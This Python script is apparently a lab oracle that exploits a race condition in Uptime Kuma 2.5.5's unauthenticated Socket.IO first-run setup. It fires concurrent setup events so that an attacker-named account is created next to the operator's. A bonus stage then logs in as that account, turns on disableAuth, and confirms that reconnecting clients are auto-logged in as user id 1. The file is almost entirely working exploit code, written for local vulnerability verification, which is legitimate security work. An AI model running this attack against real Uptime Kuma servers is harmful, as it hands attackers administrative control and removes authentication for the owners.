#!/usr/bin/env python3
"""Local oracle: Uptime Kuma 2.5.5 concurrent unauthenticated Socket.IO setup TOCTOU.

Already-connected clients barrier-emit setup. bcryptjs.hash is nextTick-sync, so
COUNT=0 is shared only if packets land in the same poll. Username UNIQUE only.
Witness username UK-SETUP-TOCTOU-WITNESS. Sequential late setup must be rejected.
Bonus: attacker login → setSettings(disableAuth) → reconnect auto-login is id 1.
Loopback only. No shells.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import threading
import time

import socketio

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18141").rstrip("/")
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "uptime-kuma-setup-toctou")
SERVICE = os.environ.get("LAB_SERVICE", "kuma")

OPERATOR = "labadmin"
OPERATOR_PW = "LabAdmin-Passw0rd-OK"
ATTACKER = "UK-SETUP-TOCTOU-WITNESS"
ATTACKER_PW = "Attacker-Passw0rd-OK"
LATE_USER = "uk-late-setup"
LATE_PW = "LateSetup-Passw0rd-OK"

# N>=8 already-connected sockets. Mix operator and attacker only so id 1
# is one of those two (needed for disableAuth auto-login identity).
N_OPERATOR = 6
N_ATTACKER = 6
N_EXTRA = 0


class KumaSock:
    def __init__(self, url: str) -> None:
        self.url = url
        self.sio = socketio.Client(
            reconnection=False,
            logger=False,
            engineio_logger=False,
            handle_sigint=False,
        )
        self.login_required = threading.Event()
        self.auto_login = threading.Event()
        self.info = None
        self.monitor_list = None

        @self.sio.on("loginRequired")
        def _lr(*_a):
            self.login_required.set()

        @self.sio.on("autoLogin")
        def _al(*_a):
            self.auto_login.set()

        @self.sio.on("info")
        def _info(info):
            self.info = info

        @self.sio.on("setup")
        def _setup(*_a):
            pass

        @self.sio.on("monitorList")
        def _ml(data):
            self.monitor_list = data

    def connect(self, wait_login: bool = True) -> bool:
        # Do not set Origin: websocket-client already sends it from the URL.
        # A duplicate/mismatched Origin is 400 Forbidden (server.js origin check).
        self.sio.connect(
            self.url,
            transports=["websocket"],
            wait_timeout=30,
            socketio_path="socket.io",
        )
        if wait_login:
            self.login_required.wait(timeout=15)
        return bool(self.sio.connected)

    def emit_ack(self, event: str, data=None, timeout: float = 60):
        box: dict = {}
        ev = threading.Event()

        def cb(*args):
            box["args"] = args
            ev.set()

        self.sio.emit(event, data, callback=cb)
        if not ev.wait(timeout):
            return {"_timeout": True}
        args = box.get("args") or ()
        if not args:
            return None
        if len(args) == 1:
            return args[0]
        return list(args)

    def disconnect(self) -> None:
        try:
            if self.sio.connected:
                self.sio.disconnect()
        except Exception:
            pass


def compose_exec(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", SERVICE, *args],
        capture_output=True,
        text=True,
        timeout=30,
    )


def oracle_users() -> list[tuple[str, str]]:
    proc = compose_exec(
        "sqlite3",
        "-separator",
        "|",
        "/app/data/kuma.db",
        "SELECT id, username FROM user ORDER BY id;",
    )
    raw = (proc.stdout or "") + (proc.stderr or "")
    print(f"IOC oracle-sqlite rc={proc.returncode} stdout={proc.stdout!r} stderr={proc.stderr!r}")
    rows: list[tuple[str, str]] = []
    if proc.returncode != 0:
        return rows
    for line in raw.splitlines():
        line = line.strip()
        if not line or "|" not in line:
            continue
        uid, name = line.split("|", 1)
        rows.append((uid.strip(), name.strip()))
    return rows


def oracle_setting(key: str) -> str:
    proc = compose_exec(
        "sqlite3",
        "/app/data/kuma.db",
        f"SELECT value FROM setting WHERE key = '{key}';",
    )
    val = (proc.stdout or "").strip()
    print(f"IOC setting key={key} rc={proc.returncode} value={val!r}")
    return val


def race_usernames() -> list[tuple[str, str]]:
    users: list[tuple[str, str]] = []
    users.extend([(OPERATOR, OPERATOR_PW)] * N_OPERATOR)
    users.extend([(ATTACKER, ATTACKER_PW)] * N_ATTACKER)
    for i in range(2, 2 + N_EXTRA):
        users.append((f"ukrace{i}", f"UkRace{i}-Passw0rd-OK"))
    return users


def run_race(url: str) -> tuple[list, list[tuple[str, str]]]:
    users = race_usernames()
    n = len(users)
    print(f"IOC race-n={n} operator={OPERATOR} attacker={ATTACKER}")
    barrier = threading.Barrier(n)
    acks: list = [None] * n
    clients: list[KumaSock | None] = [None] * n
    errors: list = [None] * n

    def worker(idx: int, username: str, password: str) -> None:
        sock = None
        try:
            sock = KumaSock(url)
            clients[idx] = sock
            if not sock.connect():
                errors[idx] = "connect-failed"
                try:
                    barrier.abort()
                except Exception:
                    pass
                return
            try:
                barrier.wait(timeout=30)
            except threading.BrokenBarrierError:
                errors[idx] = "barrier-broken"
                return
            acks[idx] = sock.emit_ack("setup", (username, password), timeout=60)
        except Exception as exc:
            errors[idx] = f"{type(exc).__name__}:{exc}"
            try:
                barrier.abort()
            except Exception:
                pass
        finally:
            if sock is not None:
                sock.disconnect()

    threads = [
        threading.Thread(target=worker, args=(i, u, p), daemon=True)
        for i, (u, p) in enumerate(users)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=90)

    for i, (u, _p) in enumerate(users):
        print(f"IOC setup-ack i={i} user={u} ack={acks[i]!r} err={errors[i]!r}")

    time.sleep(0.5)
    rows = oracle_users()
    print(f"IOC user-rows {rows}")
    return acks, rows


def sequential_late_setup(url: str) -> dict | None:
    sock = KumaSock(url)
    try:
        sock.connect()
        ack = sock.emit_ack("setup", (LATE_USER, LATE_PW), timeout=30)
        print(f"IOC sequential-late-setup ack={ack!r}")
        return ack if isinstance(ack, dict) else {"raw": ack}
    finally:
        sock.disconnect()


def password_for(username: str) -> str | None:
    if username == OPERATOR:
        return OPERATOR_PW
    if username == ATTACKER:
        return ATTACKER_PW
    if username.startswith("ukrace"):
        suffix = username[len("ukrace") :]
        return f"UkRace{suffix}-Passw0rd-OK"
    return None


def bonus_disable_auth(url: str, rows: list[tuple[str, str]]) -> None:
    id1_name = next((name for uid, name in rows if str(uid) == "1"), None)
    attacker_id = next((uid for uid, name in rows if name == ATTACKER), None)
    print(f"IOC bonus-id1={id1_name!r} attacker-id={attacker_id!r}")

    sock = KumaSock(url)
    try:
        sock.connect()
        login_ack = sock.emit_ack(
            "login", {"username": ATTACKER, "password": ATTACKER_PW}, timeout=30
        )
        print(f"IOC attacker-login ack={login_ack!r}")
        if not isinstance(login_ack, dict) or not login_ack.get("ok"):
            print("IOC bonus-skip attacker login failed")
            return
        settings_ack = sock.emit_ack("getSettings", timeout=30)
        print(f"IOC getSettings ack={settings_ack!r}")
        if not isinstance(settings_ack, dict) or not settings_ack.get("ok"):
            print("IOC bonus-skip getSettings failed")
            return
        data = dict(settings_ack.get("data") or {})
        data["disableAuth"] = True
        set_ack = sock.emit_ack("setSettings", (data, ATTACKER_PW), timeout=30)
        print(f"IOC setSettings-disableAuth ack={set_ack!r}")
        if not isinstance(set_ack, dict) or not set_ack.get("ok"):
            print("IOC bonus-skip setSettings failed")
            return
    finally:
        sock.disconnect()

    time.sleep(0.3)
    disable_val = oracle_setting("disableAuth")

    recon = KumaSock(url)
    try:
        recon.connect(wait_login=False)
        got_auto = recon.auto_login.wait(timeout=20)
        got_login_req = recon.login_required.is_set()
        print(
            f"IOC reconnect autoLogin={got_auto} loginRequired={got_login_req} "
            f"disableAuth={disable_val}"
        )
        # Identity: prepare2FA doubleCheckPassword uses socket.userID (id 1).
        atk_pw_ack = recon.emit_ack("prepare2FA", ATTACKER_PW, timeout=30)
        print(f"IOC prepare2FA-attacker-pw ack={atk_pw_ack!r}")
        id1_pw = password_for(id1_name or "")
        id1_pw_ack = None
        if id1_pw and id1_pw != ATTACKER_PW:
            id1_pw_ack = recon.emit_ack("prepare2FA", id1_pw, timeout=30)
            print(f"IOC prepare2FA-id1-pw user={id1_name} ack={id1_pw_ack!r}")
        elif id1_name == ATTACKER:
            print("IOC prepare2FA-id1-pw skipped (id 1 is attacker; attacker-pw ack is the identity)")
            id1_pw_ack = atk_pw_ack
        uri = ""
        if isinstance(id1_pw_ack, dict):
            uri = str(id1_pw_ack.get("uri") or "")
        auto_is_id1 = got_auto and bool(id1_name) and id1_name in uri
        auto_not_attacker = ATTACKER not in uri
        auto_is_operator = auto_is_id1 and id1_name == OPERATOR and auto_not_attacker
        print(
            f"IOC bonus-autologin-identity operator={auto_is_operator} "
            f"id1={id1_name} auto_is_id1={auto_is_id1} not_attacker={auto_not_attacker} "
            f"uri={uri!r}"
        )
    finally:
        recon.disconnect()


def main() -> int:
    print(f"IOC base={BASE} project={COMPOSE_PROJECT} image=louislam/uptime-kuma:2.5.5")
    acks, rows = run_race(BASE)
    names = [name for _uid, name in rows]
    count = len(rows)
    witness = ATTACKER in names
    print(f"IOC race-count={count} witness={witness} names={names}")

    if count < 2 or not witness:
        print("RETRY uptime-kuma-setup-toctou")
        return 2

    late = sequential_late_setup(BASE)
    late_msg = str((late or {}).get("msg") or "")
    late_ok = (late or {}).get("ok")
    initialized = late_ok is False and "initialized" in late_msg.lower()
    print(f"IOC sequential-initialized={initialized} msg={late_msg!r}")
    if not initialized:
        print("FAIL uptime-kuma-setup-toctou")
        print("IOC reason=late setup was not rejected (not a closed race window)")
        return 1

    try:
        bonus_disable_auth(BASE, rows)
    except Exception as exc:
        print(f"IOC bonus-error {type(exc).__name__}:{exc}")

    print(f"IOC user-rows-final {oracle_users()}")
    print("SUCCESS uptime-kuma-setup-toctou")
    return 0


if __name__ == "__main__":
    sys.exit(main())
